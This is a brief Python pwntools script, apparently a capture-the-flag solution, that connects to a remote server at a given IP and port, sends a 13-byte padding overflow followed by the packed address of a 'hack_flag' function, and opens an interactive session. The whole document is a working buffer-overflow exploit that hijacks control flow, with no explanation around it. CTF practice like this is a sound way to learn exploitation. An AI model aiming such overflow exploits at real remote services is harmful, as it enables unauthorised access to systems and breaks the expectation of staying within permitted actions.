from pwn import *

# a = process('./pwn001')
# raw_input('debug')
a = remote( '35.247.171.91', 11337)
hack_flag = 0x080487e7
buff = 'a'*0xd + p32(hack_flag)
a.sendline(buff)
a.interactive()
